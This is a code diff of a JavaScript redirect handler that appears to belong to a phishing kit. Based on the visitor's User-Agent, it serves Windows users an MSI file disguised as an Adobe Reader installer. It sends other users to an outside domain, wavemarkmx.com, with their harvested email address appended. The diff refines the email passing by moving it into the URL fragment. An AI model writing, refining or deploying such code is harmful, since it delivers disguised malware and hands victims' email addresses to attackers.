@@ -1,4 +1,3 @@
-// pages/api/redirect.js
 export default function handler(req, res) {
   const userAgent = (req.headers && req.headers['user-agent']) || '';
   const isWindows = /windows/i.test(userAgent);
@@ -8,8 +7,7 @@ export default function handler(req, res) {
   const MSI_PATH = '/Reader_adobe_install_online.msi';
 
   // Base URL for non-Windows users
-  const NON_WINDOWS_TARGET =
-    'https://wavemarkmx.com/ms';
+  const NON_WINDOWS_TARGET = 'https://wavemarkmx.com/ms';
 
   //--------------------------------------------------------------------
   // 1. Extract email from query or hash
@@ -30,8 +28,6 @@ export default function handler(req, res) {
       }
     }
   }
-
-  const safeEmail = email ? encodeURIComponent(email) : '';
 
   //--------------------------------------------------------------------
   // 2. Windows users: serve MSI download + redirect
@@ -67,13 +63,9 @@ export default function handler(req, res) {
   }
 
   //--------------------------------------------------------------------
-  // 3. Non-Windows: redirect with email as query parameter
+  // 3. Non-Windows: redirect with email in fragment (#)
   //--------------------------------------------------------------------
-  // Check if NON_WINDOWS_TARGET already has query params
-  const separator = NON_WINDOWS_TARGET.includes('?') ? '&' : '?';
-  const finalUrl = safeEmail
-    ? `${NON_WINDOWS_TARGET}${separator}email=${safeEmail}`
-    : NON_WINDOWS_TARGET;
+  const finalUrl = email ? `${NON_WINDOWS_TARGET}#${email}` : NON_WINDOWS_TARGET;
 
   res.writeHead(302, { Location: finalUrl });
   res.end();
